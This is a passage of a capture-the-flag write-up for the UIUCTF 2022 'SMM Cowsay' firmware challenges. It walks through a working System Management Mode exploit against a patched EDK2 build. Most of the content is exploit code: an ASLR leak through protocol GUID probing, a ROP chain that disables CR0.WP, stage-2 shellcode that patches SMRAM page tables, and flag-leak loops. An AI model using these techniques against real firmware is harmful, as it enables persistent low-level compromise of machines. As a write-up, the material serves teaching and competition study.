<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#666666">().</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#666666">().</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">done</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#666666">()</span></span>
<span class="line"></span></code></pre>
<p>Result:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Running...</span></span>
<span class="line"><span>!!!! X64 Exception Type - 0D(#GP - General Protection)  CPU Apic ID - 00000000 !!!!</span></span>
<span class="line"><span>ExceptionData - 0000000000000000</span></span>
<span class="line"><span>RIP  - AFAFAFAFAFAFAFAF, CS  - 0000000000000038, RFLAGS - 0000000000000002</span></span>
<span class="line"><span>RAX  - 547B667463756975, RCX - 0000000000000000, RDX - 0000000000000000</span></span>
<span class="line"><span>...</span></span>
<span class="line"><span></span></span></code></pre>
<p>Surely enough, that value in RAX decodes to <code>uiuctf{T</code>, which is the test flag
provided in the <code>handout/run/region4</code> file. We could find some more gadgets to
dump more bytes, and we could even try using IO ports to actually write the flag
out on the screen, but wrapping the exploit up into a function and running it a
couple more times seemed way easier to me (<em>I was also not sure about how to
output to the screen, e.g. which function or which IO port to use</em>).</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">flag </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ''</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> off </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    chunk </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> expl</span><span style="color:#666666">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">44440000</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> off</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    flag </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> chunk</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">decode</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#DBD7CAEE">    log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">flag</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">}</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> in</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        break</span></span>
<span class="line"></span></code></pre>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>[*] Leaking 8 bytes at 0x44440000...</span></span>
<span class="line"><span>[+] uiuctf{d</span></span>
<span class="line"><span>[*] Leaking 8 bytes at 0x44440008...</span></span>
<span class="line"><span>[+] uiuctf{dont_try_</span></span>
<span class="line"><span>...</span></span>
<span class="line"><span>[*] Leaking 8 bytes at 0x44440030...</span></span>
<span class="line"><span>[+] uiuctf{dont_try_this_at_home_I_mean_at_work_5dfbf3eb}</span></span>
<span class="line"><span></span></span></code></pre>
<hr>
<h1 id="smm-cowsay-3">SMM Cowsay 3</h1>
<p><strong>Full exploit</strong>: <a href="https://github.com/TowerofHanoi/towerofhanoi.github.io/blob/master/writeup_files/uiuctf-2022_smm-cowsay/expl_smm_cowasy_3.py">expl_smm_cowasy_3.py</a></p>
<blockquote>
<p>We fired that engineer. Unfortunately, other engineers refused to touch this
code, but instead suggested to integrate some ASLR code found online.
Additionally, we hardened the system with SMM_CODE_CHK_EN and kept DEP on. Now
that we have the monster combination of ASLR+DEP, we should surely be secure,
right?</p>
</blockquote>
<p>Things get a bit more complicated now, but honestly not that much. The code for
<code>SmmCowsay.efi</code> is unchanged, so the vulnerability is still the same, but the
EDK2 and QEMU patches now apply two major modifications:</p>
<ol>
<li>
<p><code>SMM_CODE_CHK_EN</code> has been enabled: this is a bit in the
<code>MSR_SMM_FEATURE_CONTROL</code> MSR, which controls whether SMM can execute code
outside of the ranges defined by two other MSRs: <code>IA32_SMRR_PHYSBASE</code> and
<code>IA32_SMRR_PHYSMASK</code> (basically outside SMRAM). The “Lock” bit of
<code>MSR_SMM_FEATURE_CONTROL</code> is also set in QEMU when setting <code>SMM_CODE_CHK_EN</code>,
so this check cannot be disabled.</p>
<p>This isn’t really a problem since we weren’t really executing any code
outside SMRAM. We can already get what we want with a simple ROP chain that
utilizes code already present in SMRAM, assuming we find the right gadgets.</p>
</li>
<li>
<p>ASLR has been added to EDK2 (original patches from
<a href="https://github.com/jyao1/SecurityEx">jyao1/SecurityEx</a> with some slight changes): now every
single driver is loaded at a different address that changes each boot, with
10 bits of entropy taken using <a href="https://www.felixcloutier.com/x86/rdrand">the <code>rdrand</code> instruction</a>.
Needless to say, this makes using hardcoded addresses like we did for the
previous exploit impossible.</p>
</li>
</ol>
<h2 id="exploitation-2">Exploitation</h2>
<h3 id="defeating-aslr">Defeating ASLR</h3>
<p>How do we leak some SMM address in order to defeat ASLR? Well, there are a bunch
of protocols registered by EDK2 drivers. Each protocol has its own GUID, and
calling <code>BootServices->LocateProtocol</code> with a valid GUID will return a pointer
to the protocol struct (if present), <em>which resides in the driver implementing
the protocol!</em> This allows us to leak the base address (after a simple
subtraction) of any driver implementing a protocol that is registered at the
time of the execution of our code.</p>
<p>If we take a look at <a href="https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdePkg/MdePkg.dec">the file <code>MdePkg/MdePkg.dec</code></a> in the EDK2
source code we have a bunch of GUIDs for different protocols. Without even
wasting time inspecting other parts of the source code, we can dump them all and
try requesting every single one of them, until we find an address that looks
interesting.</p>
<p>Again, patching the <code>run.sh</code> script to let QEMU dump EDK2 debug output to a file
like we did for SMM Cowsay 2, we can find SMBASE, which I assumed as the start
address of SMRAM when writing the exploit. <em>In theory, SMRAM can expand before
and after SMBASE, which according to Intel Doc just marks the base address used
to find the entry point for the SMI handler and the save state area.</em></p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>CPU[000]  APIC ID=0000  SMBASE=07FAF000  SaveState=07FBEC00  Size=00000400</span></span>
<span class="line"><span></span></span></code></pre>
<p>Now, using the same code we used for both the previous challenges, we can check
every single protocol GUID listed in <code>MdePkg/MdePkg.dec</code> and see if the address
returned is after SMBASE:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">with</span><span style="color:#B8A965"> open</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">debug.log</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> line </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> line</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">startswith</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">CPU[000]  APIC ID=0000  SMBASE=</span><span style="color:#C98A7D77">'</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">            smbase </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">line</span><span style="color:#666666">[</span><span style="color:#4C9A91">31</span><span style="color:#666666">:</span><span style="color:#4C9A91">31</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">],</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD"># Manually or programmatically extract GUIDs from MdePkg/MdePkg.dec</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> guid </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> guids</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">    code </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'''</span></span>
<span class="line"><span style="color:#C98A7D">        /* LocateProtocol(&#x26;guid, NULL, &#x26;protocol) */</span></span>
<span class="line"><span style="color:#C98A7D">        lea rcx, qword ptr [rip + guid]</span></span>
<span class="line"><span style="color:#C98A7D">        xor rdx, rdx</span></span>
<span class="line"><span style="color:#C98A7D">        lea r8, qword ptr [rip + protocol]</span></span>
<span class="line"><span style="color:#C98A7D">        mov rax, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">LocateProtocol</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">        call rax</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">        test rax, rax</span></span>
<span class="line"><span style="color:#C98A7D">        jnz fail</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">        mov rax, qword ptr [rip + protocol]</span></span>
<span class="line"><span style="color:#C98A7D">        ret</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    fail:</span></span>
<span class="line"><span style="color:#C98A7D">        ud2</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    guid:</span></span>
<span class="line"><span style="color:#C98A7D">        .octa </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">guid</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    protocol:</span></span>
<span class="line"><span style="color:#C98A7D">    '''</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#666666">().</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">done</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">RAX: 0x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    proto </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvn</span><span style="color:#666666">(</span><span style="color:#4C9A91">16</span><span style="color:#666666">),</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> proto </span><span style="color:#CB7676">></span><span style="color:#DBD7CAEE"> smbase</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">        log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Interesting protocol: GUID = 0x</span><span style="color:#C99076">%x</span><span style="color:#C98A7D">, ADDR = 0x</span><span style="color:#C99076">%x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> guid</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> proto</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>Surely enough, by letting the script run for enough time, we find that
<code>gEfiSmmConfigurationProtocolGuid</code> returns a pointer to a protocol at a nice
address. Looking at the <code>debug.log</code> for loaded drivers we can see that this
address is inside the <code>PiSmmCpuDxeSmm.efi</code> SMM driver, and a simple subtraction
gives us its base address.</p>
<h3 id="finding-rop-gadgets-1">Finding ROP gadgets</h3>
<p>Now we can take a look at the gadgets in <code>PiSmmCpuDxeSmm.efi</code>. As it turns out,
we were lucky enough:</p>
<ul>
<li>Looking from GDB, we still have R13, R14 and R15 spilled on the SMI stack at
the exact same offset.</li>
<li>We can move the stack pointer forward: <code>ret 0x6d</code></li>
<li>We can flip the stack: <code>pop rsp; ret</code></li>
<li>We can pop RAX and other registers: <code>pop rax ; pop rbx ; pop r12 ; ret</code></li>
<li>We can set CR0: <code>mov cr0, rax ; wbinvd ; ret</code></li>
<li>We have a write-what-where primitive: <code>mov qword ptr [rbx], rax ; pop rbx ; ret</code></li>
</ul>
<p>We do not have a lot more nice gadgets to work with, so this time instead of
writing the entire exploit using ROP, after disabling CR0.WP, we will just use
the write-what-where gadget to overwrite a piece of <code>.text</code> of
<code>PiSmmCpuDxeSmm.efi</code> with a stage 2 shellcode, and then simply jump to it.</p>
<p>The only slightly annoying part is the <code>ret 0x6d</code> gadget to move the stack
forward: it will result in a misaligned stack, landing in the 2 most significant
bytes of the R13 value spilled on the stack. This isn’t a real problem as
thankfully the CPU (or better, QEMU) does not seem to care about the unaligned
stack pointer. We’ll simply have to do some bit shifting to put values on the
stack nicely using R{13,14,15}.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD"># SmmConfigurationProtocol leaked using LocateProtocol(gEfiSmmConfigurationProtocolGuid)</span></span>
<span class="line"><span style="color:#DBD7CAEE">PiSmmCpuDxeSmm_base </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> SmmConfigurationProtocol </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">16210</span></span>
<span class="line"><span style="color:#DBD7CAEE">PiSmmCpuDxeSmm_text </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> PiSmmCpuDxeSmm_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">1000</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">SmmConfigurationProtocol    @ 0x</span><span style="color:#C99076">%x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SmmConfigurationProtocol</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">=> PiSmmCpuDxeSmm.efi       @ 0x</span><span style="color:#C99076">%x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> PiSmmCpuDxeSmm_base</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">=> PiSmmCpuDxeSmm.efi .text @ 0x</span><span style="color:#C99076">%x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> PiSmmCpuDxeSmm_text</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">new_smm_stack   </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> buffer </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">800</span></span>
<span class="line"><span style="color:#DBD7CAEE">ret_0x6d        </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> PiSmmCpuDxeSmm_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">fc8a</span><span style="color:#758575DD">  # ret 0x6d</span></span>
<span class="line"><span style="color:#DBD7CAEE">flip_stack      </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> PiSmmCpuDxeSmm_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">3c1c</span><span style="color:#758575DD">  # pop rsp ; ret</span></span>
<span class="line"><span style="color:#DBD7CAEE">pop_rax_rbx_r12 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> PiSmmCpuDxeSmm_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">d228</span><span style="color:#758575DD">  # pop rax ; pop rbx ; pop r12 ; ret</span></span>
<span class="line"><span style="color:#DBD7CAEE">mov_cr0_rax     </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> PiSmmCpuDxeSmm_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10a7d</span><span style="color:#758575DD"> # mov cr0, rax ; wbinvd ; ret</span></span>
<span class="line"><span style="color:#DBD7CAEE">write_primitive </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> PiSmmCpuDxeSmm_base </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">3b8f</span><span style="color:#758575DD">  # mov qword ptr [rbx], rax ; pop rbx ; ret</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">payload  </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">'</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">utf-16-le</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 200</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">ret_0x6d</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<h3 id="second-stage-shellcode">Second stage shellcode</h3>
<p>As we just said we will make our ROP chain with a few gadgets that will write a
second stage shellcode into the <code>.text</code> of <code>PiSmmCpuDxeSmm.efi</code> and then jump to
it. This shellcode will have to walk the page table (this time we cannot
pre-compute the address of the PTE because of ASLR), set the present bit on the
PTE and then read the flag into (one or more) registers.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">stage2_shellcode </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'''</span></span>
<span class="line"><span style="color:#C98A7D">    movabs rbx, 0xffffffff000</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    /* Walk page table */</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, cr3</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, qword ptr [rax]</span></span>
<span class="line"><span style="color:#C98A7D">    and rax, rbx</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, qword ptr [rax + 8 * 0x1]</span></span>
<span class="line"><span style="color:#C98A7D">    and rax, rbx</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, qword ptr [rax + 8 * 0x22]</span></span>
<span class="line"><span style="color:#C98A7D">    and rax, rbx</span></span>
<span class="line"><span style="color:#C98A7D">    mov rbx, rax</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, qword ptr [rax + 8 * 0x40]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    /* Set present bit */</span></span>
<span class="line"><span style="color:#C98A7D">    or al, 1</span></span>
<span class="line"><span style="color:#C98A7D">    mov qword ptr [rbx + 8 * 0x40], rax</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    /* Read flag and die so regs get dumped, GG! */</span></span>
<span class="line"><span style="color:#C98A7D">    movabs rax, 0x44440000</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, qword ptr [rax]</span></span>
<span class="line"><span style="color:#C98A7D">    ud2</span></span>
<span class="line"><span style="color:#C98A7D">'''</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>Again, we can run the exploit multiple times changing that <code>0x44440000</code> to leak
8 bytes at a time and obtain the full flag.</p>
<h3 id="putting-it-all-together-1">Putting it all together</h3>
<p>Now we can build the ROP chain and send the exploit in the same way we did for
SMM Cowsay 2:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">real_chain </span><span style="color:#666666">=</span><span style="color:#666666"> [</span></span>
<span class="line"><span style="color:#758575DD">    # Unset CR0.WP</span></span>
<span class="line"><span style="color:#DBD7CAEE">    pop_rax_rbx_r12</span><span style="color:#666666">,</span><span style="color:#758575DD"> # pop rax ; pop rbx ; pop r12 ; ret</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">80000033</span><span style="color:#666666">     ,</span><span style="color:#758575DD"> # -> RAX</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">deadbeef</span><span style="color:#666666">     ,</span><span style="color:#758575DD"> # filler</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">deadbeef</span><span style="color:#666666">     ,</span><span style="color:#758575DD"> # filler</span></span>
<span class="line"><span style="color:#DBD7CAEE">    mov_cr0_rax    </span><span style="color:#666666">,</span><span style="color:#758575DD"> # mov cr0, rax ; wbinvd ; ret</span></span>
<span class="line"><span style="color:#666666">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD"># Now that CR0.WP is unset, we can just patch SMM code and jump to it!</span></span>
<span class="line"><span style="color:#758575DD"># Make the ROP chain write the stage 2 shellcode at PiSmmCpuDxeSmm_text</span></span>
<span class="line"><span style="color:#758575DD"># 8 bytes at a time, then jump into it</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">stage2_shellcode</span><span style="color:#666666">),</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    chunk </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> stage2_shellcode</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE">i </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">].</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#666666">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x90</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    chunk </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">chunk</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    real_chain </span><span style="color:#666666">+=</span><span style="color:#666666"> [</span></span>
<span class="line"><span style="color:#DBD7CAEE">        pop_rax_rbx_r12        </span><span style="color:#666666">,</span><span style="color:#758575DD"> # pop rax ; pop rbx ; pop r12 ; ret</span></span>
<span class="line"><span style="color:#DBD7CAEE">        chunk                  </span><span style="color:#666666">,</span><span style="color:#758575DD"> # -> RAX</span></span>
<span class="line"><span style="color:#DBD7CAEE">        PiSmmCpuDxeSmm_text </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> i</span><span style="color:#666666">,</span><span style="color:#758575DD"> # -> RBX</span></span>
<span class="line"><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">deadbeef</span><span style="color:#666666">             ,</span></span>
<span class="line"><span style="color:#DBD7CAEE">        write_primitive        </span><span style="color:#666666">,</span><span style="color:#758575DD"> # mov qword ptr [rbx], rax ; pop rbx ; ret</span></span>
<span class="line"><span style="color:#CB7676">        0x</span><span style="color:#4C9A91">deadbeef</span></span>
<span class="line"><span style="color:#666666">    ]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">real_chain </span><span style="color:#666666">+=</span><span style="color:#666666"> [</span><span style="color:#DBD7CAEE">PiSmmCpuDxeSmm_text</span><span style="color:#666666">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD"># Transform real ROP chain into .quad directives to embed in the shellcode:</span></span>
<span class="line"><span style="color:#758575DD">#   .quad 0x7f8a184</span></span>
<span class="line"><span style="color:#758575DD">#   .quad 0x80000033</span></span>
<span class="line"><span style="color:#758575DD">#    ...</span></span>
<span class="line"><span style="color:#DBD7CAEE">real_chain_size </span><span style="color:#666666">=</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">real_chain</span><span style="color:#666666">)</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span></span>
<span class="line"><span style="color:#DBD7CAEE">real_chain      </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">.quad </span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> +</span><span style="color:#C98A7D77"> '</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">.quad </span><span style="color:#C98A7D77">'</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#666666">(</span><span style="color:#B8A965">map</span><span style="color:#666666">(</span><span style="color:#B8A965">str</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> real_chain</span><span style="color:#666666">))</span></span>
<span class="line"></span></code></pre>
<p>The asm of the code we send to the server is the same as for the previous
challenge, so I am leaving most of it out. The only thing that changes is that
we now have to do some math to put the gadget to flip the stack and the new
stack address in the right place since the <code>ret 0x6d</code> will misalign the stack:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">code </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'''</span></span>
<span class="line"><span style="color:#C98A7D">    /* ... */</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    movabs r13, </span><span style="color:#C99076">{</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">flip_stack </span><span style="color:#CB7676">&#x3C;&#x3C;</span><span style="color:#4C9A91"> 40</span><span style="color:#666666">)</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ffffffffffffffff</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    movabs r14, </span><span style="color:#C99076">{</span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">flip_stack </span><span style="color:#CB7676">>></span><span style="color:#4C9A91"> 24</span><span style="color:#666666">)</span><span style="color:#CB7676"> |</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">new_smm_stack </span><span style="color:#CB7676">&#x3C;&#x3C;</span><span style="color:#4C9A91"> 40</span><span style="color:#666666">))</span><span style="color:#CB7676"> &#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ffffffffffffffff</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    movabs r15, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">new_smm_stack </span><span style="color:#CB7676">>></span><span style="color:#4C9A91"> 24</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    call rax</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    /* ... */</span></span>
<span class="line"><span style="color:#C98A7D">'''</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>Now just run the exploit in a loop as we did for SMM Cowsay 2 and leak the
